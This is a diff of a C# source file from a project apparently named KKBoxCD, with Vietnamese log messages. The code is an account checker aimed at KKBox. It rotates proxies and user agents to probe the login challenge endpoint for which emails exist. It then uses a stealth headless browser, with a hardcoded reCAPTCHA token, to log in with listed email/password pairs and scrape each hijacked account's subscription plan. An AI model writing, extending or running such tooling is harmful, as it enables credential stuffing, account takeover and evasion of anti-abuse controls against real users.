@@ -1,16 +1,25 @@
 ﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
 using System.Net;
 using System.Threading;
 using KKBoxCD.Core.Manager;
+using KKBoxCD.Core.Support;
 using KKBoxCD.Core.Utils;
+using KKBoxCD.Properties;
 using MihaZupan;
 using Newtonsoft.Json;
+using PuppeteerExtraSharp;
+using PuppeteerExtraSharp.Plugins.ExtraStealth;
+using PuppeteerSharp;
 using RestSharp;
 
 namespace KKBoxCD.Core
 {
     public class AutoThread
     {
+        private readonly string[] PerfectTest;
         private readonly Config mConfig;
         private readonly AccountManager mAccountManager;
         private readonly ProxyManager mProxyManager;
@@ -25,10 +34,29 @@ namespace KKBoxCD.Core
 
         public Proxy Proxy { get; private set; }
 
+        public Browser Browser { get; private set; }
+
+        public Page Page { get; private set; }
+
+        public PageCTL PageCTL { get; private set; }
+
         #endregion
 
         public AutoThread(int thread_id)
         {
+            if (!File.Exists(Consts.PerfectTestFile))
+            {
+                File.WriteAllText(Consts.PerfectTestFile, "11design.g@gmail.com");
+            }
+            PerfectTest = File.ReadAllLines(Consts.PerfectTestFile);
+            if (!PerfectTest.Any())
+            {
+                PerfectTest = new string[]
+                {
+                    "11design.g@gmail.com"
+                };
+            }
+
             ThreadID = thread_id;
             mConfig = Config.Instance;
             mAccountManager = AccountManager.Instance;
@@ -41,11 +69,20 @@ namespace KKBoxCD.Core
 
         public void Start()
         {
-            Thread thread = new Thread(Work)
+            if (mConfig.Mode == Config.RunMode.CheckExist)
             {
-                Name = "AutoThread"
-            };
-            thread.Start();
+                new Thread(CheckExist)
+                {
+                    Name = "AutoThread"
+                }.Start();
+            }
+            else
+            {
+                new Thread(GetPlan)
+                {
+                    Name = "AutoThread"
+                }.Start();
+            }
         }
 
         private void Log(string content)
@@ -60,16 +97,12 @@ namespace KKBoxCD.Core
 
         #region Work Function
 
-        private void Work()
+        private void CheckExist()
         {
             while (true)
             {
-                Log(">> Khởi tạo biến gửi");
-                string phone_country_code = "65";
-                string phone_territory_code = "SG";
-                string username = "";
-
                 Log(">> Khởi tạo biến nháp");
+                RestClient client = null;
                 RestRequest request;
                 RestResponse response;
                 dynamic data = null;
@@ -83,15 +116,6 @@ namespace KKBoxCD.Core
                         Log(">> Đã hết Proxy");
                         break;
                     }
-
-                    Log(">> Lấy Account");
-                    Account = mAccountManager.Get();
-                    if (Account == null)
-                    {
-                        Log(">> Đã hết Account");
-                        break;
-                    }
-                    username = Account.Email;
 
                     Log(">> Khởi tạo RestClient");
                     IWebProxy proxy;
@@ -107,91 +131,117 @@ namespace KKBoxCD.Core
                     {
                         proxy.Credentials = new NetworkCredential(Proxy.Username, Proxy.Password);
                     }
-                    RestClient client = new RestClient(new RestClientOptions
+                    client = new RestClient(new RestClientOptions
                     {
                         Proxy = proxy,
                         UserAgent = Addons.RandomUserAgent(),
                         Timeout = 10000
                     });
 
-                    Log(">> Khởi tạo SRP, tính A");
-                    string A;
+                    Log(">> Kiểm tra Proxy");
                     try
                     {
-                        A = mChromeClient.Page.EvaluateFunctionAsync<string>(@"(name) => {
-                            RemoveSRP(name);
-                            const srp = GetSRP(name);
-                            srp.init();
-                            srp.computeA();
-                            return srp.A.toString(16);
-                        }", username).Result;
-                    }
-                    catch
-                    {
-                        throw new Exception("Khởi tạo SRP, tính A thất bại");
-                    }
-
-                    Log(">> Yêu cầu Challenge");
-                    try
-                    {
+                        string perfect_test = PerfectTest[new Random().Next(0, PerfectTest.Length)];
                         request = new RestRequest("https://kkid.kkbox.com/challenge", Method.Post);
-                        request.AddParameter("username", username);
-                        request.AddParameter("phone_country_code", phone_country_code);
-                        request.AddParameter("phone_territory_code", phone_territory_code);
-                        request.AddParameter("a", A);
+                        request.AddParameter("username", perfect_test);
+                        request.AddParameter("phone_country_code", "65");
+                        request.AddParameter("phone_territory_code", "SG");
+                        request.AddParameter("a", Addons.RandomHash(512));
                         response = client.ExecuteAsync(request).Result;
-                        data = JsonConvert.DeserializeObject<dynamic>(response.Content);
                     }
                     catch
                     {
-                        throw new Exception("Yêu cầu Challenge thất bại");
+                        throw new Exception("Kiểm tra Proxy thất bại");
+                    }
+                    if (response.StatusCode == HttpStatusCode.NotFound)
+                    {
+                        States.ProxyBlock++;
+                        throw new Exception("Proxy đang bị chặn");
                     }
 
-                    Log(">> Kiểm tra Challenge");
-                    if (data.error != null)
+                    for (int i = 0; i < 5; i++)
                     {
-                        string error = data.error;
-                        string status_code = data.status_code;
-
-                        if (status_code.Equals("404"))
+                        Log(">> Lấy Account");
+                        Account = mAccountManager.Get();
+                        if (Account == null)
                         {
-                            States.NotFound++;
-                            Account.Status = AccountStatus.NotFound;
-                            Account.Data = error;
-                            mAccountManager.Write(Account);
-                            Account = null;
-                            continue;
+                            break;
                         }
-                        else if (status_code.Equals("403"))
+
+                        Log(">> Yêu cầu Challenge");
+                        try
                         {
-                            States.SRPUnsupported++;
-                            Account.Status = AccountStatus.SRPUnsupported;
-                            Account.Data = error;
+                            request = new RestRequest("https://kkid.kkbox.com/challenge", Method.Post);
+                            request.AddParameter("username", Account.Email);
+                            request.AddParameter("phone_country_code", "65");
+                            request.AddParameter("phone_territory_code", "SG");
+                            request.AddParameter("a", Addons.RandomHash(512));
+                            response = client.ExecuteAsync(request).Result;
+                            data = JsonConvert.DeserializeObject<dynamic>(response.Content);
+                        }
+                        catch
+                        {
+                            throw new Exception("Yêu cầu Challenge thất bại");
+                        }
+
+                        Log(">> Kiểm tra Challenge");
+                        if (data.error != null)
+                        {
+                            string error = data.error;
+                            string status_code = data.status_code;
+
+                            if (status_code.Equals("404"))
+                            {
+                                // NotFound or BlockIP
+                                States.NotFound++;
+                                Account.Status = AccountStatus.NotFound;
+                                Account.Data = error;
+                                mAccountManager.Write(Account);
+                                Account = null;
+                                continue;
+                            }
+                            else if (status_code.Equals("403"))
+                            {
+                                // Login Without Crpyt Password
+                                States.SRPUnsupported++;
+                                Account.Status = AccountStatus.SRPUnsupported;
+                                Account.Data = error;
+                                mAccountManager.Write(Account);
+                                Account = null;
+                                continue;
+                            }
+                            else
+                            {
+                                //Not Verify Mail
+                                States.Other++;
+                                Account.Status = AccountStatus.Other;
+                                Account.Data = error;
+                                mAccountManager.Write(Account);
+                                Account = null;
+                                continue;
+                            }
+                        }
+                        else if (data.g != null && data.s != null && data.q != null)
+                        {
+                            // Login With Crpyt Password
+                            Log(">> Ghi kết quả");
+                            States.Perfect++;
+                            Account.Status = AccountStatus.Perfect;
                             mAccountManager.Write(Account);
                             Account = null;
                             continue;
                         }
                         else
                         {
-                            States.Other++;
-                            Account.Status = AccountStatus.Other;
-                            Account.Data = error;
-                            mAccountManager.Write(Account);
-                            Account = null;
-                            continue;
+                            throw new Exception("Yêu cầu Challenge thất bại");
                         }
                     }
-                    else if (data.g != null && data.s != null && data.q != null)
+
+                    Log(">> Kiểm tra Account");
+                    if (mAccountManager.IsEmpty())
                     {
-                        Log(">> Ghi kết quả");
-                        States.Perfect++;
-                        Account.Status = AccountStatus.Perfect;
-                        mAccountManager.Write(Account);
-                        Account = null;
-                    }
-                    else
-                    {
-                        throw new Exception("Yêu cầu Challenge thất bại");
+                        Log(">> Đã hết Account");
+                        break;
                     }
                 }
                 catch (Exception ex)
@@ -204,14 +254,9 @@ namespace KKBoxCD.Core
                 finally
                 {
                     Log(">> Dọn dẹp tài nguyên");
-
-                    if (username != null)
+                    if (client != null)
                     {
-                        try
-                        {
-                            mChromeClient.Page.EvaluateFunctionAsync("async (name) => RemoveSRP(name)", username).Wait();
-                        }
-                        catch { }
+                        client.Dispose();
                     }
                     if (Account != null)
                     {
@@ -230,11 +275,7 @@ namespace KKBoxCD.Core
             }
         }
 
-        #endregion
-
-        #region
-
-        private void CheckFull()
+        private void GetPlan()
         {
             while (true)
             {
@@ -252,6 +293,7 @@ namespace KKBoxCD.Core
                 string t = "";
 
                 Log(">> Khởi tạo biến nháp");
+                RestClient client = null;
                 RestRequest request;
                 RestResponse response;
                 dynamic data = null;
@@ -292,7 +334,7 @@ namespace KKBoxCD.Core
                     {
                         proxy.Credentials = new NetworkCredential(Proxy.Username, Proxy.Password);
                     }
-                    RestClient client = new RestClient(new RestClientOptions
+                    client = new RestClient(new RestClientOptions
                     {
                         Proxy = proxy,
                         UserAgent = Addons.RandomUserAgent(),
@@ -370,6 +412,7 @@ namespace KKBoxCD.Core
 
                         if (status_code.Equals("404"))
                         {
+                            // NotFound or BlockIP
                             States.NotFound++;
                             Account.Status = AccountStatus.NotFound;
                             Account.Data = error;
@@ -379,8 +422,9 @@ namespace KKBoxCD.Core
                         }
                         else if (status_code.Equals("403"))
                         {
-                            States.LoginFailed++;
-                            Account.Status = AccountStatus.LoginFailed;
+                            // Login Without Crpyt Password
+                            States.SRPUnsupported++;
+                            Account.Status = AccountStatus.SRPUnsupported;
                             Account.Data = error;
                             mAccountManager.Write(Account);
                             Account = null;
@@ -388,7 +432,13 @@ namespace KKBoxCD.Core
                         }
                         else
                         {
-                            throw new Exception(string.Concat("Phân loại lỗi thất bại: ", error));
+                            //Not Verify Mail
+                            States.Other++;
+                            Account.Status = AccountStatus.Other;
+                            Account.Data = error;
+                            mAccountManager.Write(Account);
+                            Account = null;
+                            continue;
                         }
                     }
                     else if (data.g != null && data.s != null && data.q != null)
@@ -486,7 +536,8 @@ namespace KKBoxCD.Core
                     }
 
                     Log(">> Khởi tạo Recaptcha");
-                    recaptcha = mRecaptchaClient.GetToken();
+                    //recaptcha = mRecaptchaClient.GetToken();
+                    recaptcha = "03AGdBq25tXgFIWEwtRQ8oePqoxb5q_TPoGxX2cRoXsVxPujjUjxH5zW99WOg8lOfUdctYgJ3W4anbjHgIeNK0ukylHaYDUtq4MiA4DNNsudGi9mzVqL1Ozm7SZz5MX27-se3lqNPUGAE4nLKJGAEbKkLZVwMxahk1GFKSrEYKpuWREDT8uI5z8JR5b33kdicfh8Q9V-_m1GCPy6CMjGV3GjU7L2KCNoMRkA7ZOoFD-gC5iwjIyZzsowQeM9qSsBaLcFTJJnXgHXwIuvVUgUjHj_b_-QJRbn3hBhQhlOPaozZNTeHItad9I3nW1kYIV-5WHminTQlNZs5xzWisX7mGsji2Tc_PTWFUXqsKXoBebRU7p_3Lt4wcD0OEHHp3rmz5KVTTYSLpzbJRZypv_QJepYkqJNHwmrFgF6WVk-Szc0wpHoNwMPgLmTQjf4IDXo3q6Kxwwditg4HN";
                     if (recaptcha == null)
                     {
                         throw new Exception("Khởi tạo Recaptcha thất bại");
@@ -626,7 +677,6 @@ namespace KKBoxCD.Core
                 finally
                 {
                     Log(">> Dọn dẹp tài nguyên");
-
                     if (ori_username != null)
                     {
                         try
@@ -634,6 +684,10 @@ namespace KKBoxCD.Core
                             mChromeClient.Page.EvaluateFunctionAsync("async (name) => RemoveSRP(name)", ori_username).Wait();
                         }
                         catch { }
+                    }
+                    if (client != null)
+                    {
+                        client.Dispose();
                     }
                     if (Account != null)
                     {
@@ -647,6 +701,325 @@ namespace KKBoxCD.Core
                     }
                 }
             }
+        }
+
+        private void GetPlanBrowser()
+        {
+            while (true)
+            {
+                try
+                {
+                    Log(">> Lấy Proxy");
+                    Proxy = mProxyManager.Random();
+                    if (Proxy == null)
+                    {
+                        Log("Đã hết Proxy");
+                        break;
+                    }
+
+                    Log(">> Kiểm tra lượng tài khoản");
+                    if (mAccountManager.IsEmpty())
+                    {
+                        Log("Đã hết Account");
+                        break;
+                    }
+
+                    Log(">> Khởi tạo Browser và Page");
+                    PuppeteerExtra extra = new PuppeteerExtra();
+                    StealthPlugin stealth = new StealthPlugin();
+                    LaunchOptions options = new LaunchOptions()
+                    {
+                        Headless = !mConfig.IsDebug,
+                        ExecutablePath = Consts.ChromeFile,
+                        Args = new string[]
+                        {
+                            //$"--proxy-server=\"{Proxy.Address}:{Proxy.Port}\"",
+                            $"--app=\"data:text/html,<title></title>\"",
+                            "--allow-cross-origin-auth-prompt",
+                            "--disable-web-security",
+                            "--disable-sync",
+                            "--disable-translate",
+                            "--disable-backgrounding-occluded-windows",
+                            "--disable-background-networking",
+                            "--disable-client-side-phishing-detection",
+                            "--disable-dev-shm-usage",
+                            "--disable-breakpad",
+                            "--disable-domain-reliability",
+                            "--disable-features=HardwareMediaKeyHandling,OmniboxUIExperimentHideSteadyStateUrlPathQueryAndRef,OmniboxUIExperimentHideSteadyStateUrlScheme,OmniboxUIExperimentHideSteadyStateUrlTrivialSubdomains,ShowManagedUi",
+                            "--disable-hang-monitor",
+                            "--disable-ipc-flooding-protection",
+                            "--disable-notifications",
+                            "--disable-offer-store-unmasked-wallet-cards",
+                            "--disable-popup-blocking",
+                            "--disable-print-preview",
+                            "--disable-prompt-on-repost",
+                            "--disable-remote-fonts",
+                            "--disable-default-apps",
+                            "--disable-image-loading",
+                            "--disable-speech-api",
+                            "--hide-scrollbars",
+                            "--ignore-certificate-errors",
+                            "--ignore-gpu-blacklist",
+                            "--metrics-recording-only",
+                            "--no-default-browser-check",
+                            "--no-first-run",
+                            "--no-pings",
+                            "--no-sandbox",
+                            "--no-zygote",
+                            "--disable-gpu",
+                            "--password-store=basic",
+                            "--reset-variation-state",
+                            "--use-mock-keychain",
+                        },
+                    };
+                    Browser = extra.LaunchAsync(options).Result;
+                    Page = Browser.PagesAsync().Result[0];
+                    PageCTL = new PageCTL(Page);
+
+                    bool success = false;
+                    int loop = 5;
+                    while (loop > 0)
+                    {
+                        Log(">> Lấy Account");
+                        Account = mAccountManager.Get();
+                        if (Account == null)
+                        {
+                            Log("Đã hết Account");
+                            throw new Exception("Đã hết Account");
+                        }
+
+                        Log(">> Truy cập trang");
+                        if (!Page.Url.StartsWith("https://kkid.kkbox.com/login"))
+                        {
+                            success = PageCTL.GoToAsync("https://kkid.kkbox.com/login", "#recaptcha", new NavigationOptions
+                            {
+                                WaitUntil = new WaitUntilNavigation[]
+                                {
+                                    WaitUntilNavigation.DOMContentLoaded
+                                }
+                            }).Result;
+                            if (!success)
+                            {
+                                throw new Exception("Truy cập trang thất bại");
+                            }
+                        }
+
+                        Log(">> Đợi Recaptcha sẵn sàng");
+                        success = WaitRecaptcha();
+                        if (!success)
+                        {
+                            throw new Exception("Đợi Recaptcha thất bại");
+                        }
+
+                        Log(">> Dừng tải trang");
+                        Thread.Sleep(250);
+                        PageCTL.StopLoadingAsync().Wait();
+
+                        PageCTL.TypeAsync(Account.Email, "#show-username").Wait();
+                        Thread.Sleep(250);
+                        PageCTL.TypeAsync(Account.Password, "#show-password").Wait();
+                        Thread.Sleep(2500);
+                        try
+                        {
+                            Page.ClickAsync("#btn-submit");
+                        }
+                        catch { }
+                        //Log("Tiêm trích trang");
+                        //Thread.Sleep(250);
+                        //try
+                        //{
+                        //    Page.EvaluateExpressionAsync(Resources.kkbox_inject).Wait();
+                        //}
+                        //catch
+                        //{
+                        //    throw new Exception("Tiêm trích trang");
+                        //}
+
+                        //Log(">> Gửi lệnh đăng nhập");
+                        //Thread.Sleep(250);
+                        //try
+                        //{
+                        //    Page.EvaluateFunctionAsync(@"
+                        //    (username, password) => {
+                        //        window.__username = username;
+                        //        window.__password = password;
+                        //        challenge();
+                        //    }", Account.Email, Account.Password).Wait();
+                        //}
+                        //catch
+                        //{
+                        //    throw new Exception("Gửi lệnh đăng nhập thất bại");
+                        //}
+
+                        Console.WriteLine("Pause");
+                        Console.ReadKey();
+
+                        Log(">> Đợi chuyển hướng");
+                        success = PageCTL.WaitForExistAnyAsync(new string[]
+                        {
+                            "#logout",
+                            "#toast-content",
+                            ".server_prompt"
+                        }).Result;
+                        if (!success)
+                        {
+                            throw new Exception("Đợi kết quả đăng nhập thất bại");
+                        }
+
+                        Log(">> Kiểm tra đăng nhập");
+                        Thread.Sleep(250);
+                        if (PageCTL.ExistAsync("#logout").Result)
+                        {
+                            Log(">> Lấy trạng thái");
+                            Thread.Sleep(250);
+                            try
+                            {
+                                Account.Data = Page.EvaluateFunctionAsync<string>(@"
+                                () => {
+                                    try {
+                                        const xhr = new XMLHttpRequest();
+                                        xhr.open('GET', '/plan', false);
+                                        xhr.send();
+                                        document.body.outerHTML = xhr.responseText;
+                                        const no_plan = document.querySelector('.no_plan');
+                                        if (no_plan != null) {
+                                            return 'No Plan';
+                                        }
+                                        const card = document.querySelector('.plan_card');
+                                        const data = card.innerText.split('\n');
+                                        var plan = '';
+                                        if (data.length > 0) {
+                                            plan += data[0] + ' | ';
+                                        }
+                                        if (data.length > 1) {
+                                            plan += data[1] + ' | ';
+                                        }
+                                        if (data.length > 4) {
+                                            plan += data[4] + ' | ';
+                                        }
+                                        if (data.length > 12) {
+                                            plan += data[12];
+                                        }
+                                        return plan;
+                                
+                                    } catch {
+                                        return 'Get Failed';
+                                    }
+                                }").Result;
+                            }
+                            catch
+                            {
+                                Account.Data = "Get Failed";
+                            }
+
+                            Log(">> Ghi kết quả");
+                            Account.Status = AccountStatus.Perfect;
+                            mAccountManager.Write(Account);
+                            Account = null;
+                            States.Perfect++;
+                            break;
+                        }
+                        else if (PageCTL.ExistAsync("#toast-content").Result)
+                        {
+                            Log(">> Đọc mã lỗi");
+                            string error_content;
+                            try
+                            {
+                                error_content = PageCTL.GetElementInnerText("#toast-content").Result;
+                            }
+                            catch
+                            {
+                                error_content = string.Empty;
+                            }
+
+                            Log(">> Phân loại lỗi");
+                            if (error_content.Equals("not_verified"))
+                            {
+                                //Log(">> Ghi kết quả");
+                                //Account.Status = AccountStatus.NotExist;
+                                //mAccountManager.Write(Account);
+                                //Account = null;
+                                //States.NotExist++;
+                            }
+                            else if (error_content.Equals("login_failed"))
+                            {
+                                //Log(">> Ghi kết quả");
+                                //Account.Status = AccountStatus.Wrong;
+                                //mAccountManager.Write(Account);
+                                //Account = null;
+                                //States.Wrong++;
+                            }
+                            else
+                            {
+                                throw new Exception("Phân loại lỗi ngoại lệ");
+                            }
+                        }
+                        else if (PageCTL.ExistAsync(".server_prompt").Result)
+                        {
+                            //Log(">> Ghi kết quả");
+                            //Account.Status = AccountStatus.LoginFail;
+                            //mAccountManager.Write(Account);
+                            //Account = null;
+                            //States.LoginFail++;
+                        }
+                        else
+                        {
+                            throw new Exception("Kiểm tra đăng nhập thất bại");
+                        }
+                        loop--;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    if (mConfig.ShowExc)
+                    {
+                        Console.WriteLine($">> Lỗi phát sinh: {ex}");
+                    }
+                }
+                finally
+                {
+                    Log(">> Dọn dẹp tài nguyên");
+                    if (Account != null)
+                    {
+                        mAccountManager.Push(Account);
+                        Account = null;
+                    }
+                    if (Proxy != null)
+                    {
+                        mProxyManager.Push(Proxy);
+                        Proxy = null;
+                    }
+                }
+            }
+        }
+
+        private bool WaitRecaptcha(int times = 15000)
+        {
+            while (times > 0)
+            {
+                try
+                {
+                    bool success = Page.EvaluateFunctionAsync<bool>(@"
+                    () => {
+                        try {
+                            return document.querySelector('#recaptcha').value.length > 0;
+                        }
+                        catch {
+                            return false;
+                        }
+                    }").Result;
+
+                    if (success)
+                    {
+                        return true;
+                    }
+                }
+                catch { }
+
+                times -= 1000;
+                Thread.Sleep(1000);
+            }
+            return false;
         }
 
         #endregion
